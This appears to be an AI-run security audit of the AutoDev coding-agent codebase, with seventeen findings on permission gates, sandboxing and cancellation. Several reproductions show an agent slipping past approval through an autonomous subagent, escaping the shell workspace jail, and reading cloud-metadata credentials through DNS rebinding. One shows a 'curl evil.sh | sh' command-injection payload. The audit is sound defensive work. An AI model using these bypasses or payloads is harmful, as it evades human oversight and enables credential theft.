# A10 · P3 A–E — fresh-context gap hunt

> Security and correctness sweep for defects **nobody has fixed**, run per `§0.2a` by an agent deliberately told not to audit whether the phase's work was done.
>
> **Run** 2026-09-02 · **Working tree** was not clean at read time (a parallel remediation was in flight); line numbers are working-tree numbers.
>
> ⚠ **This is the auditor's raw report, preserved unedited.** Findings acted on are recorded against their task ids in the MDP, and several were **verified in the main session before any change** — one summary claim (that `TG3-01`…`TG3-28` "do not exist") proved to be about them being *unimplemented*, not absent, which the remediation states. An audit is evidence, not a verdict.

---

# Fresh-context gap hunt — AutoDev (`C:\AIRS Foundry\autodev\autodev`)

Findings are appended as confirmed. Ordering within the file is chronological;
the `## Summary` at the end carries the severity ranking.

---

## G-1 · Every write/execute/network tool is permission-prompted TWICE, with two different call_ids · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\tool_executor.rs:233` and `:441`
**Defect:** `execute_batch` decides permission for *every* call up front (line 233,
`call_id = format!("{}-{}", session_id, tool_use_id)`), partitions the approved
calls, and then the serial write branch calls `self.check_permission(&call_id, &tool, &input)`
a **second time** at line 441 — with a freshly generated `Uuid::new_v4()` call_id
(line 423). Nothing memoizes the first approval: `check_permission` only short-circuits
on `always_allow` (populated exclusively by an `AllowAlways` answer) and on
`ToolEffect::requires_prompt`. A plain `Allow` therefore does not suppress the
second prompt.

The header comment on `execute_batch` claims this is "the **one** permission
decision in the codebase (`P3-11`, `P3-64`)" and that "every tool passes exactly
one gate". Non-concurrency-safe tools pass two.
**Why it matters:**
- In `ManualApproval`, the user sees two dialogs per write/edit/bash call and must
  answer both. Answering the first and dismissing the second yields
  `"Tool 'x' was denied by user"` for a call the user already approved.
- The second prompt has its own independent 5-minute `PERMISSION_TIMEOUT`, so a
  batch of N write tools can stall for N×5 minutes before failing closed.
- The two prompts carry different `call_id` values for the same logical call
  (`<session>-<tool_use_id>` vs a random UUID), so any front-end that correlates
  the approval dialog to the in-flight tool by `call_id` sees an orphan.
- `emit_tool_start` (line 433) is emitted *before* the second gate, so the UI
  reports the tool as started while the approval is still pending, and again if
  it is then denied.
**Reproduction:** Run any session in `PermissionMode::ManualApproval` and have the
model emit a single `write_file` tool call. `execute_batch` → `check_permission`
(line 233) → prompt #1 → Allow → `approved_tools` → `write_tools` →
`check_permission` (line 441) → prompt #2 for the same call.
**Confidence:** certain from the code; the exact UI consequence of the mismatched
`call_id` was not verified because I did not run the front end.

---

## G-2 · PreToolUse / PostToolUse / OnToolError hooks never fire for concurrency-safe tools · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\tool_executor.rs:313-377` (read partition) vs `:443-510` (write partition)
**Defect:** The serial write partition fires `HookRegistry::fire(&HookType::PreToolUse, …)`
and honours its veto (`should_continue == false` blocks the call), then fires
`PostToolUse`/`OnToolError`. The concurrent partition — every tool whose effect is
`ToolEffect::Read` — fires **no hooks at all**. There is no `HookRegistry` call
anywhere inside the spawned task (lines 324-374).
**Why it matters:** A `PreToolUse` hook is the user's own programmable guard. As
written it can block `write_file` and `bash` but is structurally unable to block
`read_file`, `grep`, `glob`, `list_directory`, or `search_memory` — the exact
tools an exfiltration-shaped prompt injection would use to enumerate a workspace.
The hook's `extra` payload in the write branch even advertises
`"concurrency_safe": tool.effect().is_concurrency_safe()`, implying the hook sees
both classes; it only ever sees `false`.
**Reproduction:** Register any `PreToolUse` hook that returns "block". Have the
model call `read_file`. The hook is never invoked and the read proceeds.
**Confidence:** certain.

---

## G-3 · The permission prompt's cancellation branch can never fire — `ToolExecutor::with_state` has zero callers · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\tool_executor.rs:80` (definition), `:599-602` (the dead branch), `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\engine.rs:328-336` (the only production construction site)
**Defect:** `ToolExecutor` carries `state: Option<Arc<Mutex<AppState>>>`, set only by the
builder `with_state`. `grep -rn "with_state" --include=*.rs` over the whole workspace
returns **exactly one hit: the definition itself.** No caller anywhere, tests
included. `engine.rs:328` builds the executor and chains only
`with_session_manager`, so `self.state` is `None` for every executor that ever runs.

The consequence is in `request_permission`'s `tokio::select!`:

```rust
if self.state
    .as_ref()
    .map(|s| s.lock_tolerant().is_cancelled(&self.session_id))
    .unwrap_or(false)
{ break; }
```

With `state == None` the expression is unconditionally `false`, so the async block
loops on a 250 ms sleep forever and that arm of the `select!` is unreachable.

The field's own doc comment asserts the opposite: *"`Option` because `airsctl` and
the tests build an executor with no application state; there the timeout is the only
bound."* In fact the timeout is the only bound **everywhere**, including the Tauri app.
`AgentEngine` already owns `self.state` — it is one `.with_state(self.state.clone())`
away — so this is an unwired builder, not a missing dependency.
**Why it matters:** `P3-08`'s stated purpose was that "the permission wait must
notice the user cancelling while a prompt is open". It does not. A user who hits
Cancel with an approval dialog open (or whose UI listener died) waits the full
`PERMISSION_TIMEOUT` of 300 s before the engine advances, and the engine holds the
turn open for that whole window. With G-1's duplicate prompt, a batch of N write
tools is N×300 s.
**Reproduction:** Start any Mode-1 session in `ManualApproval`. Have the model call
`write_file`. When the dialog appears, cancel the session (`AppState::cancel`). The
engine does not return for 300 s; the cancel poll never observes the flag.
**Confidence:** certain (`with_state` has no caller; verified by workspace-wide grep
excluding `target/`).

---

## G-4 · `bash`'s "load-bearing" workspace jail compares the working directory against itself · critical
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\bash.rs:66-74`
**Defect:**
```rust
let cwd_path = PathBuf::from(&ctx.working_dir);
if let Err(msg) = validate_workspace_path(&cwd_path, &ctx.working_dir) {
```
The *target* and the *workspace* are the same string. `validate_workspace_path`
canonicalizes both and asks `paths_match_prefix(canonical_target, canonical_workspace)`
— which for two canonicalizations of one path is always true. The only way this
returns `Err` is if `ctx.working_dir` fails to canonicalize (i.e. does not exist).

It is therefore an **existence check wearing a jail's comment**. The comment above it
claims: *"The shell cwd MUST be inside the configured workspace. Without this check,
a Mode 2 worker whose `ctx.working_dir` somehow drifted away from the configured
workspace would run shell commands against the wrong tree."* No second value — no
"configured workspace" independent of `ctx.working_dir` — is ever read here, so drift
is undetectable by construction.
**Why it matters:** `check_redirect_targets`'s own docstring defers to this check
twice — *"the cwd jail in `execute` is the load-bearing check"* — and so does
`builtin_tools/mod.rs:41-44` (*"Load-bearing safety net"*). The load-bearing check does
not exist. What actually bounds `bash` is the `>`/`>>`/`tee` token scanner, which the
same docstring correctly describes as heuristic. Any write that is not a shell
redirect — `cp`, `mv`, `curl -o`, `python -c "open(...,'w')"`, `Copy-Item`, `git
clone` into an absolute path, `npm i --prefix` — reaches the filesystem anywhere the
user can write, with no check at all. `bash` is registered in `FastDevelopment`,
`Review`, and the MCP worker set, and runs unprompted inside every subagent (see G-5).
**Reproduction:** With workspace `C:\proj`, have the model call
`bash{"command": "copy secrets.env C:\Users\Public\out.env"}`. `validate_workspace_path("C:\proj", "C:\proj")` returns `Ok`;
`check_redirect_targets` finds no `>`/`tee` token; the command runs.
**Confidence:** certain that the check is tautological. I did not execute the escape
(read-only audit), but no code path between the check and `cmd.output()` inspects the
command for anything other than redirect tokens.

---

## G-5 · Subagents run `Autonomous` with the full tool registry and a model-authored system prompt — the model can escape `ManualApproval` in one call · critical
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\subagent\native_runner.rs:258-268` (`PermissionMode::Autonomous`, `PAMode::FastDevelopment`), `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\spawn_subagent.rs:145-200` (config built entirely from model input)
**Defect:** The child engine is constructed with a **hardcoded** `PermissionMode::Autonomous`
and `PAMode::FastDevelopment`, regardless of the parent's mode. `register_for_mode(FastDevelopment)`
grants `bash`, `write_file`, `edit_file`, `append_file`, `e2e_probe`, `check_file`,
`analyze_diff`, and `spawn_subagent` itself. `ToolEffect::requires_prompt` returns
`false` for every effect under `Autonomous`, so nothing in the child ever prompts.

Every field of `SubagentConfig` except `working_dir`, `depth` and `parent_slug` is
taken verbatim from the model's tool arguments — including `system_prompt`, which
becomes the child's `system_prompt_override`. `tools` defaults to `Vec::new()`, and
`ToolRegistry::restrict_to` treats empty as *unrestricted*, so omitting the field
(which the model does by default) yields the full registry.
**Why it matters:** `tool_effect.rs` states the `ManualApproval` policy as *"Everything
with a consequence is prompted."* A model in `ManualApproval` that wants to run a
shell command unprompted calls `spawn_subagent` once — a single `Network`-effect
prompt whose user-facing consequence text reads *"send data from your machine to an
external service"* — and the child then runs arbitrary `bash` with no further prompt.
Under BYOK that is the user's own machine and key. The escalation also chains: the
child has `spawn_subagent` too, up to `MAX_NESTING_DEPTH = 3`.

`native_runner.rs:257` justifies this as *"a subagent has no user to prompt for
permission"* — but `RunnerDeps` carries `pending: PendingPermissions` and passes it
straight into the child engine, so the prompting channel is fully wired and simply
never used. The stated reason is contradicted by the argument list two lines below it.
**Reproduction:** Session in `ManualApproval`. Model emits
`spawn_subagent{"task_description":"…","system_prompt":"You may run any shell command."}`.
Approve the one prompt. The child executes `bash` with no prompt (verifiable by
reading `check_permission` → `requires_prompt(&Autonomous) == false`).
**Confidence:** certain from the code. Whether this is intended product behaviour is a
design question for the owner — but the docstring justification is factually wrong,
and no code path lets a user opt out.

---

## G-6 · `bash` timeout is model-chosen with no upper bound, and a running tool cannot be cancelled · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\bash.rs:56-58`, `:122-127`
**Defect:** `let timeout_secs = input["timeout_secs"].as_u64().unwrap_or(DEFAULT_TIMEOUT_SECS);`
— the value is taken straight from model-controlled tool arguments and passed to
`tokio::time::timeout(Duration::from_secs(timeout_secs), …)` with no clamp. `DEFAULT_TIMEOUT_SECS`
is 120, but the model can pass `u64::MAX`. There is no `.min(MAX_TIMEOUT_SECS)`
anywhere in the file.

Compounding it: the engine's cancellation check (`engine.rs`, top of the turn loop)
runs only *between* turns. Nothing observes cancellation while a tool is executing, and
`ToolExecutor` has no state handle at all (G-3). So an in-flight `bash` cannot be
interrupted by the user.
**Why it matters:** One tool call — `bash{"command":"npm run dev","timeout_secs":99999999}`
or any command that waits on stdin under `cmd /C` — wedges the session with no user-reachable
recovery short of killing the app. The same unclamped pattern appears in
`spawn_subagent`'s `timeout_secs` (`spawn_subagent.rs:186-190`), though there the
engine's `MAX_TOOL_TURNS = 20` bounds the work.
**Reproduction:** `bash{"command":"pause","timeout_secs":4294967296}` on Windows
(`cmd /C pause` blocks on stdin). The tool never returns; cancelling the session does
not stop it.
**Confidence:** certain for the missing clamp and the missing in-tool cancellation. I
did not measure tokio's internal sleep ceiling; whatever it is, it is far beyond a
usable bound.

---

## G-7 · `e2e_probe`'s loopback check is TOCTOU — the URL is resolved twice, so DNS rebinding walks straight through it · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\e2e_probe.rs:78-103` (`validate_probe_url`) and `:482-495` (`http_probe`)
**Defect:** `validate_probe_url` resolves the host with `(host, port).to_socket_addrs()`
and requires every returned address to be loopback. It then **discards the addresses**
and returns `Ok(())`. `http_probe` later builds a fresh `reqwest::Client` and calls
`client.get(url)`, which performs its **own, independent** DNS resolution of the same
hostname. Nothing pins the validated address, and nothing forbids a hostname whose
records differ between the two lookups.

The function's own doc comment anticipates half of this — *"A string check on
'localhost' would not do: `127.0.0.1.nip.io` and any attacker-controlled DNS name
resolving to the metadata address both read as ordinary hostnames"* — and then leaves
the time-of-check/time-of-use window open. A TTL-0 record answering `127.0.0.1` on the
first query and `169.254.169.254` on the second satisfies the check and is fetched.
**Why it matters:** This is the exact SSRF-with-readback `P3-68` was written to close.
Up to 400 characters of the response body come back in `response_body_excerpt` and
into the model's context. The tests that gate it (`the_cloud_metadata_endpoint_is_refused`,
`a_public_address_is_refused`) both use IP **literals**, which cannot rebind — so the
gate cannot detect the bypass it is guarding.
**Reproduction:** Model calls `e2e_probe{"start_cmds":["echo x"],"probe_url":"http://<rebinding-host>/latest/meta-data/iam/security-credentials/","expected_text":"x"}`
where `<rebinding-host>` alternates A records. `validate_probe_url` sees loopback and
passes; `reqwest` re-resolves and fetches the metadata service.
**Confidence:** probable. The two-resolution structure is certain from the code; I
could not run a rebinding host to confirm reqwest does not cache the first lookup
(it does not share a resolver with `to_socket_addrs`, and the client is built fresh
per probe, so no cache spans the two).

---

## G-8 · `e2e_probe` spawns model-chosen shell commands without the credential env scrub `bash` applies · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\e2e_probe.rs:381-397` vs `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\bash.rs:108-120`
**Defect:** `bash` strips every credential-shaped variable from the child's environment
before spawning, and its comment states the rationale in full: *"this tool runs commands
the **model** chose: a single missed variable here is a readable secret… The first
version of this landed in the Windows branch only, which is its own small lesson about
two-branch fixes."* `e2e_probe` spawns `sh -c <model string>` / `cmd /C <model string>`
for every entry in `start_cmds` and applies **no** `env_remove` — grep for
`looks_like_a_credential` returns only `bash.rs` and `env_scrub.rs`.

`e2e_probe` also has no path-jail call of any kind, and `start_cmds` is an unbounded
array, so N model-chosen processes are spawned per call.
**Why it matters:** The startup scrub (`src-tauri/src/main.rs:85`) is the surviving
guard, so this is defence-in-depth lost rather than an open credential today. But the
scrub's own `KEEP` allowlist and its heuristic `looks_like_a_credential` are exactly
what the second layer exists to backstop, and the same lesson the file cites (a fix
landing on one branch only) has recurred one tool over.
**Reproduction:** `e2e_probe{"start_cmds":["sh -c 'env > out.txt'"],"probe_url":"http://127.0.0.1:1/","expected_text":"x"}`.
The child inherits whatever the startup scrub missed.
**Confidence:** certain that the scrub is absent from `e2e_probe`; the residual risk
depends on the startup scrub's coverage, which I did not exhaustively test.

---

## G-9 · `terminate` / `abort` / `abort_children_of` cannot stop a subagent that is being awaited — the very case `P3-24` targets · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\subagent\manager.rs:216-241` (`terminate`), `:169-186` (`await_result`), `:266-296` (`abort_children_of`)
**Defect:** The `JoinHandle` is stored once, in `ManagerEntry.task`, and **both** paths
`take()` it:

- `await_result` does `entry.task.take()` before awaiting — the registry entry is left
  with `task: None`.
- `terminate` does `entry.handle.status = Terminated; entry.task.take()`, then
  `if let Some(t) = task { if force { t.abort(); } … }`.

So when a subagent is being awaited (which is what `spawn_subagent` and
`spawn_parallel_subagents` do — they call `mgr.await_result(&handle.id)` immediately
after `spawn`), `terminate` finds `None`, **skips the abort entirely**, removes the
registry entry, and returns `Ok(())`. The tokio task keeps running to completion.

`abort_children_of` counts that `Ok(())` as a stop and logs
`"cancelled {stopped} child(ren)"`.
**Why it matters:** This is precisely the defect `P3-24`'s docstring says it fixed:
*"a cancelled parent left its children running to completion — finishing their work,
emitting their events and billing the user's key for a turn nobody would read."* The
in-flight case is the only one that matters, and it is the one that still leaks. It is
reachable three ways:
1. `abort_subagent` / `terminate_subagent` from the Subagent Monitor UI
   (`src-tauri\src\commands\subagent_commands.rs:104-118`) while the parent awaits.
2. `abort_children_of` from `engine.rs`'s in-loop cancel — for a child spawned by a
   *previous* turn's `spawn_parallel_subagents` that is still awaited.
3. The pre-start `abort_children_of` in `engine.rs`'s cancellation check.

Removing the entry also drops the `PoolPermit` while the child is still executing, so
the pool's concurrency accounting under-counts live subagents.

The two `p3_24_tests` in this file both exercise an **empty** registry
(`cancelling_a_session_with_no_children_is_a_no_op`,
`aborting_children_does_not_deadlock_on_the_registry_lock`), so neither can observe this.
**Reproduction:** Spawn a subagent through the builtin tool (which awaits it), then call
the `abort_subagent` Tauri command with its id. `terminate` returns `Ok(())`; the child
continues issuing provider calls.
**Confidence:** certain from the code (`task` is a single `Option`, taken by whichever
path reaches it first, and `terminate` has no fallback when it is `None`).

---

## G-10 · `send_message` has no concurrency guard, and a second message silently clears a pending cancel · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\src-tauri\src\commands\agent_commands.rs:60-70`, and `RunningGuard::drop` at `:190-200`
**Defect:** `send_message` unconditionally does
`s.agents.insert(session_id, ActiveAgent { is_running: true, cancel_flag: false })`
— it never reads the existing entry. Nothing anywhere refuses a second
`send_message` for a session whose agent is already running.

Two consequences follow from `AppState::is_cancelled`/`cancel_agent` being keyed on
`session_id` alone (`autodev-core\src\state\app_state.rs:68-79`):

1. **A pending cancel is erased.** `cancel_agent` sets `cancel_flag = true`; a
   subsequent `send_message` on the same session overwrites the entry with
   `cancel_flag: false`. The still-running first engine polls `is_cancelled` at the top
   of its next turn, sees `false`, and continues — including keeping its subagents alive.
2. **`RunningGuard::drop` clears the flags for whichever run finishes first**, so the
   second, still-running engine is recorded as not running.

Two engines then share one `session_id`: the same cancel flag, the same
`PendingPermissions` map, and the same `messages` rows (each computes
`prior_assistant_count` from its own snapshot of history, so the later writer
mis-slices).
**Why it matters:** Cancel is the user's only stop control (and by G-3 it already
cannot interrupt an open permission prompt, by G-6 it cannot interrupt a running
`bash`). This adds a path where it is silently reverted.
**Reproduction:** Send a message; while it runs, click Cancel, then send another
message before the first turn reaches its next turn boundary. The first engine keeps
running and billing.
**Confidence:** certain that no guard exists and that `cancel_flag` is reset on every
`send_message`. Whether the shipped UI permits a second send while running I did not
verify — the Tauri command accepts it regardless, and Tauri commands are callable
from any renderer code path.

---

## G-11 · `spawn_qc_review`'s depth guard was never re-pointed — it still compares the parent side, so the pool's depth branch stays unreachable through it · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\spawn_qc_review.rs:82`
**Defect:** `P3-58` states the rule and both other spawn tools follow it:
> *"One boundary now, defined once in `pool.rs` and compared against the same side of
> it everywhere: reject when the CHILD would exceed it."*

`spawn_subagent.rs:99-101` and `spawn_parallel_subagents.rs:103-105` both compute
`let child_depth = ctx.depth + 1; if child_depth > MAX_NESTING_DEPTH`.
`spawn_qc_review.rs:82` still reads `if ctx.depth >= subagent::pool::MAX_NESTING_DEPTH`
— the parent-side comparison the fix identifies as the defect. It then builds the
config with `depth: ctx.depth + 1` (`:190`) exactly like the others.
**Why it matters:** Two things, both of the class this phase named:
1. `ctx.depth >= 3` fires whenever `child_depth > 3` would, and one generation
   earlier, so `SubagentPool::acquire`'s `depth > MAX_NESTING_DEPTH` branch remains
   unreachable via this tool — the *"guard that could not fire"* the fix exists to
   remove, still present at the third call site.
2. The effective limit through `spawn_qc_review` is one generation shallower than
   through the other two, so `MAX_NESTING_DEPTH` means two different things depending
   on which spawn tool is used. A QC reviewer at depth 3 is refused here and allowed
   by `spawn_subagent`.
**Reproduction:** An agent at `ctx.depth == 3` calls `spawn_qc_review` → refused with
*"caller is at depth 3 (limit 3)"*, while the same agent calling `spawn_subagent` is
also refused but by the correct rule; an agent at `ctx.depth == 2` is allowed by both,
and only `spawn_subagent` can produce the depth-3 child the pool test
(`the_depth_boundary_is_where_it_says_it_is`) asserts must be allowed.
**Confidence:** certain (verified by grepping every `MAX_NESTING_DEPTH` comparison in
the workspace).

---

## G-12 · The QC hourly ceiling is documented as configurable and is a hardcoded `const` · low
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\spawn_qc_review.rs:375-377` (doc) vs `:392` (`const CEILING_USD_PER_HOUR: f64 = 5.0`)
**Defect:** The module comment says *"if the rolling 1-hour QC spend exceeds a
configurable threshold (default $5), the dispatcher's next `spawn_qc_review` call is
rejected"*. `CEILING_USD_PER_HOUR`, `PROVISIONAL_COST_USD` and `WINDOW` are all private
`const`s with no settings read, no env read, and no `pub` accessor. Nothing anywhere
reads a QC ceiling from config — grep for `CEILING_USD_PER_HOUR` returns only the
definition and its two uses inside the same module.
**Why it matters:** A user whose fleet legitimately needs more than $5/hour of QC has
no way to raise it; the doc tells them there is one. Unlike the daily cap
(`budget::daily::DailyCap::load()`), this one has no persisted setting.
**Reproduction:** Search the settings surface for a QC hourly limit; there is none.
**Confidence:** certain.

---

## G-13 · Compaction slices the history at a fixed offset and can orphan `tool_result` blocks / break role alternation · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\compaction.rs:186-193` and `:255-263` (`compact_with_summary`), `:120-142` (`compact_truncate`)
**Defect:** Both compaction strategies rebuild the history as
`[messages[0]] + [synthetic assistant message] + messages[len-KEEP_RECENT_MESSAGES..]`
with `KEEP_RECENT_MESSAGES = 10`. The cut index is a **fixed offset**; nothing inspects
what kind of content blocks sit on either side of it.

Inside `engine.rs`'s turn loop the history alternates
`assistant{ToolUse…}` / `user{ToolResult…}` (`engine.rs:790-795`). Two invalid shapes
follow directly:

1. **Orphaned `tool_result`.** When `len - 10` lands on a `user` message carrying
   `ToolResult` blocks, its matching `assistant{ToolUse}` message is at `len - 11` and
   is dropped. `anthropic.rs:119-133` serialises the `tool_result` verbatim — there is
   no pairing check anywhere in the provider layer or in compaction. The codebase
   already names the mirror case as fatal: *"a `tool_use` with no matching
   `tool_result` — a hard 400 on the next request"* (`tool_executor.rs:264-273`,
   `P3-57`).
2. **Two consecutive `assistant` messages.** The synthetic summary/truncation notice is
   pushed with `role: "assistant"`, and the tail begins with an `assistant` message
   whenever the parity works out that way. Nothing normalises this.

Which of the two occurs depends on the parity of `history.len()` at the moment
compaction fires, which depends on how many prior messages `build_history` produced —
i.e. it is effectively arbitrary per session.

Secondary, same function: `estimate_tokens` (`:105-116`) sums only `messages`. The
system prompt and the ~40 tool definitions (`registry.to_definitions()`, sent on every
request) are **not** counted, so the estimate systematically under-reads and the
effective compaction point sits above the intended 80% — the direction this file's own
comment says *"fails the turn outright"*.
**Why it matters:** `history = compacted` (engine.rs:429) replaces the in-memory
history, so a malformed compaction poisons every remaining turn of that run — after
the user has already paid for the summarisation call that produced it. The failure
surfaces as a provider error, which reads as an outage.
**Reproduction:** Run a session long enough to exceed 80% of the model's window with
tool calls in it (any large `bash` or `read_file` output accelerates this). When
`CompactionEngine::compact_with_summary` fires with `history.len()` such that
`len - 10` is a tool-result `user` message, the next request carries an orphan
`tool_result`.
**Confidence:** certain that no pairing or alternation check exists on either path
(grep for `tool_result`/`ToolResult` in `compaction.rs` returns nothing). The precise
provider rejection is Anthropic's documented behaviour, which I could not exercise
without a live call.

---

## G-14 · `glob` and `list_directory` have no byte cap and no clamp on the model-chosen result count · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\glob.rs:36-45` and `:205-212`; `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\builtin_tools\list_directory.rs:47`
**Defect:** Every other output-producing tool carries a **byte** ceiling:
`read_file` `READ_FILE_MAX_BYTES = 256 KB`, `grep` `MAX_TOTAL_BYTES = 256 KB` *and*
`MAX_LINE_BYTES`, `bash` `MAX_OUTPUT_BYTES = 50 KB`, `e2e_probe` `CHILD_LOG_TAIL_BYTES`,
`validate` `MAX_CHECKER_BYTES`. `glob` and `list_directory` carry none. Their only
bound is a **count** that the model supplies:

- `glob`: `#[serde(default = "default_max_results")] max_results: usize` — default 200,
  no `.min(...)` anywhere in the file.
- `list_directory`: `input["max_entries"].as_u64().unwrap_or(500) as usize` — same.

`glob` emits one JSON object per match (`path`, `is_directory`, plus optional
`size_bytes`/`modified_at` when `include_metadata: true`), so the output size is
`max_results × path length` with nothing capping the product.
**Why it matters:** `glob{"pattern":"**/*","max_results":5000000,"include_metadata":true}`
walks the workspace (minus seven hard-coded noise directories — and the description
now correctly notes `.gitignore` is *not* honoured) and serialises every hit. That
string goes into the model's context, into the `messages` table via
`session_mgr.append_message`, and into the `agent:tool-end` UI event. Both tools have
`ToolEffect::Read`, so they are **never prompted in any mode** and run in the
concurrent partition — ten such calls can be in flight at once.
**Reproduction:** As above, in any workspace with a large `node_modules`-free tree
(or a `vendor/`, `.venv/`, `Pods/` directory, none of which are in `skip_dirs`).
**Confidence:** certain — no byte accounting exists on either path.

---

## G-15 · The shipped system prompt contradicts itself and misstates the tools it documents · medium
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\agent\context.rs` — `BASE_SYSTEM_PROMPT` (`:160-260`) and `REVIEW_SYSTEM_PROMPT` (`:262-283`)
**Defect:** Four separate mismatches between the prompt every session sends and the code:

1. **Self-contradiction on lock files.** Core Behavioral Rule 8 says
   *"**Lock files are sacred** — Write `current_tasks/issue-N.lock` before starting a
   task. Delete it only on clean completion."* The "AutoDev Pipeline Actions" section
   ~40 lines later says *"Do NOT write filesystem lockfiles (`current_tasks/*.lock`)
   … Lockfiles and worktrees here would just be dead artifacts the rest of the system
   never consults."* Both are in force in the same prompt.
2. **`bash` default timeout is wrong.** The prompt states *"Default timeout is 30s —
   for long test suites, increase it explicitly."* `bash.rs:12` is
   `const DEFAULT_TIMEOUT_SECS: u64 = 120`. The prompt actively instructs the model to
   raise a timeout that is already four times longer than stated — and `timeout_secs`
   has no upper clamp (G-6).
3. **`edit_file` parameter names are wrong.** The prompt documents
   `edit_file(path, old_str, new_str)`; the schema requires `old_string` / `new_string`
   (`edit_file.rs:52-62`).
4. **Review Mode promises a checkpoint it does not add.** `REVIEW_SYSTEM_PROMPT` opens
   *"Review Mode is identical to Fast Development but adds an explicit permission
   checkpoint before any write operation."* `register_for_mode` treats
   `PAMode::Review` and `PAMode::FastDevelopment` as one arm ("Review: same as
   FastDevelopment (permission layer is at execution time)"), and `agent_commands.rs`
   hardcodes `PermissionMode::ManualApproval` for **both**. Review Mode adds nothing;
   the checkpoint is already there in Fast Development. The only difference between
   the two modes is this prompt text.
**Why it matters:** These are the instructions the model acts on. (1) produces
either wasted `write_file` calls creating dead lock artifacts or inconsistent
behaviour turn to turn; (2) pushes the model toward long, unbounded `bash` timeouts;
(3) costs a failed tool call on first use; (4) tells the user (via the mode picker's
own description) that they have selected a stricter safety posture than they have.
The codebase's own standard — *"A docstring or comment that promises one behaviour
while the code does another is a bug"* — applies here with more force than usual,
because the reader is the model.
**Reproduction:** Read `BASE_SYSTEM_PROMPT` against `bash.rs:12` and
`edit_file.rs:52-62`; read `REVIEW_SYSTEM_PROMPT` against
`builtin_tools/mod.rs:188` (`PAMode::FastDevelopment | PAMode::Review =>`) and
`agent_commands.rs:160`.
**Confidence:** certain.

---

## G-16 · Hook variable substitution splices model-controlled tool output into `sh -c` and into HTTP URLs with no escaping · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\hooks\executor.rs:213-236` (`substitute`), used at `:56` (shell command), `:63` (`working_dir`), `:105` (HTTP URL)
**Defect:** `substitute` serialises the whole `HookContext` to JSON and does a plain
`String::replace` of `{{<key>}}` with the raw value — no shell quoting, no URL
encoding, no allow-list of which keys may be interpolated. Non-string values are
inserted as `other.to_string()`, i.e. raw JSON.

The context handed to tool hooks is built in `tool_executor.rs:444-468` and
`:488-509` and contains:
- `tool_call.input` — the tool's arguments (redacted for secrets, but otherwise the
  model's own text);
- `extra.output` — **the tool's full output** on `PostToolUse` / `OnToolError`, i.e.
  file contents, `bash` stdout, grep hits;
- `extra.working_dir`.

The substituted string is then passed straight to `cmd /C <string>` or
`sh -c <string>`.
**Why it matters:** A user-authored hook such as
`{"action":{"shell":{"command":"echo {{extra}} >> audit.log"}}}` — the obvious use of
the feature — becomes a command-injection sink whose input is whatever the agent just
read or ran. A file in the workspace containing `"; curl evil.sh | sh; #` is enough.
The `Http` action has the same shape: `substitute(url, ctx)` puts the same content into
a URL that is then fetched, which is an exfiltration channel with no loopback
restriction (contrast `e2e_probe`, which does restrict).

This is not the user "shooting themselves in the foot": the feature is *documented* as
variable substitution, so interpolating context is the intended usage, and nothing in
the type or the docs signals that the values are attacker-influenced.

Secondary: hook stdout/stderr are captured with no byte cap (`:76-95`) and stored in
`HookExecutionLog`, so one chatty hook writes an unbounded row.
**Reproduction:** Configure any `PostToolUse` shell hook whose command contains
`{{extra}}` or `{{tool_call}}`. Have the agent `read_file` a file containing shell
metacharacters. The metacharacters are executed.
**Confidence:** certain from the code. I did not check whether the shipped default
hook set uses these placeholders — the injection exists whenever a user's hook does.

---

## G-17 · The one recipe that declares `Supervised` is `Mode2Only`, so it can never reach the code that reads `permission_mode` · high
**Where:** `C:\AIRS Foundry\autodev\autodev\autodev-core\src\recipes\defaults.rs:1963-1969` (`fleet_smoke_recipe`), `C:\AIRS Foundry\autodev\autodev\autodev-core\src\recipes\runner.rs:717-741` (the `Mode2Only` early return) and `:825` (`PermissionMode::from(&recipe.permission_mode)`)
**Defect:** `PermissionMode::from(&recipe.permission_mode)` appears exactly once in the
tree — `runner.rs:825`, inside the **Mode 1** (Rust `AgentEngine`) branch. Every path
to that line first passes the `fallback_policy` check at `:717`:

```rust
if matches!(recipe.fallback_policy, FallbackPolicy::Mode2Only) {
    …
    self.set_worker_status(worker_slug, "fallback_idle");
    return Ok(());
}
```

`fleet_smoke_recipe` is declared with **both** `permission_mode: Supervised` **and**
`fallback_policy: Mode2Only` (`defaults.rs:1968-1969`). It therefore returns at `:741`
whenever Mode 2 is unavailable, and runs inside the orchestrator (which never consults
`permission_mode` — grep confirms `:825` is the only reader) whenever Mode 2 is
available. Either way the `Supervised` declaration is never converted into a
`PermissionMode`.

The other eight shipped recipes all declare `RecipePermissionMode::Autonomous`
(`defaults.rs:216, 380, 637, 864, 979, 1157, 1323, 1878`). So `PermissionMode::from`
provably evaluates to `Autonomous` for every recipe that can reach it — the same
result as the hardcoded `PermissionMode::Autonomous` that `P3-65` replaced.

The comment above the declaration asserts the opposite:
> *"⚠ The ONE recipe that keeps `Supervised`, and now genuinely gets it: `schedule:
> None` — fleet-smoke is triggered by a human, who is therefore present to answer.
> **This is the declaration that proves the control is live rather than decorative.**"*

The reasoning checks `schedule` and stops there; it does not check `fallback_policy`,
which is declared four lines below it and is what actually decides whether the Mode 1
engine is ever constructed.
